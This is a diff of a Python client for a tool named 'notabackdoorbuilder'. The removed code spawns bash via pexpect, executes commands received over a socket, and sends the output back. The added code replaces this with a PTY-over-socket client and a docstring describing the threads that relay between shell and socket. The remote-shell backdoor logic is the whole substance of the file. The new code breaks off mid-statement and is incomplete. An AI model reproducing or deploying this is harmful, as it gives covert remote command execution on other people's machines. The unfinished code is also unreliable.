@@ -1,40 +1,37 @@
 import notabackdoorbuilder
+import ptysocket
 import threading
-import pexpect
 import time
+from typing import Any
+from typing import TypeVar, Generic
 
-def handle_output(context, callback):
-	print("`handle_output` started...")
-	while True:
-		shell = context.get("shell")
-		shell.expect(".+")
-		context["output_buffer"] = shell.before.decode()
-		callback(context)
+"""
+5 io threads:
+1. read_shell 		- reads from pexpect and adds the output to the output buffer.
+2. write_shell		- writes to pexpect from the input buffer.
+3. read_socket		- reads from socket and adds to the input buffer.
+4. write_socket		- writes to socket from the output buffer.
+5. timeout_manager 	- waits for 1 second, if nothing happened in a specified buffer, it will send the buffer to the other side.
 
-def handle_new_output(context):
-	output_buffer = context.get("output_buffer")
-	sock = context.get("socket")
-	print(f"\n{output_buffer}")
-	sock.send(output_buffer.encode())
-	if "%n@%m %1~ %#" in output_buffer:
-		sock.send("\u0003".encode())
-		print(f"\n\n\n\n[snet]\n\n\n")
+one io switch to control weather we are currently reading or writing.
+"""
 
-def handle_command(context):
-	print("Handling command...")
-	if not context.get("shell"):
-		print("Creating shell...")
-		context["shell"] = pexpect.spawn("bash")
-		context["output_buffer"] = ""
-		context["output_thread"] = threading.Thread(target=handle_output, args=(context, handle_new_output))
-		context["output_thread"].start()
-		time.sleep(0.1)
-		context["shell"].sendline("")
-	shell = context.get("shell")
-	shell.sendline(context.get("data").strip())
-	print(f"Sent [{context.get('data')}] to shell.")
+T = TypeVar("T")
+
+class ValueReference(Generic[T]):
+	def __init__(self, value:T):
+		self.value = value
+
+def before_send(context):
+	pass
 
 notabackdoorbuilder.handle_setup("client")
 
-def main():
-	pass
+def main(context):
+	context["ptysocket"] = ValueReference(ptysocket.PTYSocketClient())
+	pty_sock_ref:ValueReference[ptysocket.PTYSocketClient] = context["ptysocket"]
+
+	pty_sock_ref.value.connect()
+	pty_sock_ref.value.
+
+
